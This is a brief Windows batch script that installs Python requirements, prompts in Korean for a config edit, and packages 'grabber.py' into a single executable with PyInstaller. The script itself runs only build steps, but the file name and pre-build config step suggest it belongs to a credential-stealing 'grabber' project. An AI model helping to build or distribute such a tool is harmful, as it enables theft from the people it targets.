title Building...
@echo off
cls
pip install -r requirements.txt
echo 빌드전에 __config__를 수정해주세요. 수정 하셨으면 아무키나 누르세요
pause
pyinstaller -F grabber.py
exit